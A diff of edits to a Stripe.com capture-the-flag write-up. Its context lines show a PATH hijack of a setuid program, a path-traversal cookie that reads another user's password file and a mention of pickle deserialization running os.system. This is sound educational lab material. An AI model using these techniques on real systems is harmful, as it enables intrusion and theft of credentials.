@@ -29,7 +29,8 @@ my successful Stripe.com CTF attempt.
 
 
 
-
+             .----- scroll down
+             v 
 
 
 
@@ -106,7 +107,7 @@ my successful Stripe.com CTF attempt.
 Level1
 ======
 
-Goal is it to get the setuid program /levels/level01 to read the
+Goal is to get the setuid program /levels/level01 to read the
 file /home/level02/.password. Let's look at its sourcecode:
 
     level01@ctf5:/tmp/tmp.SH2ekcQrHv$ cat /levels/level01.c 
@@ -120,7 +121,6 @@ file /home/level02/.password. Let's look at its sourcecode:
       system("date");
       return 0;
     }
-    level01@ctf5:/tmp/tmp.SH2ekcQrHv$ 
 
 As you can see, the program executes the program date to display
 the current time. Since there is no path hardcoded it's simple
@@ -169,7 +169,10 @@ chrome webinspector.
     Authorization: [copied from webinspector headers]
     Cookie: user_details=../../home/level03/.password
 
-Here is the result: 
+Here is the result (Notice: I run this on my own machine since
+access to ctf.stri.pe seems to be blocked from within the ctf 
+machines): 
+
     dividuum@narf:/tmp$ nc ctf.stri.pe 80 < req
     HTTP/1.1 200 OK
     [...]
@@ -408,7 +411,7 @@ we send contains "; job: <pickled>", the regex will allow us
 to provide our own pickled data.
 
 This might not look very useful, but pickle is not a safe serialization
-format. You can create a pickled data that will execute os.system with
+format. You can create pickled data that will execute os.system with
 a given string.
 
     dividuum@narf:~/stripe$ cat example.py 
@@ -451,6 +454,7 @@ you if you guessed wrong:
     Welcome to the password checker!
     ......
     level06@ctf5:/tmp/tmp.q55uR6zRsw$ Ha ha, your password is incorrect!
+    level06@ctf5:/tmp/tmp.q55uR6zRsw$
 
 One (invalid) way to get the content of /home/the-flag/.password is
 to try every possible password. This clearly wont work. So we need another 
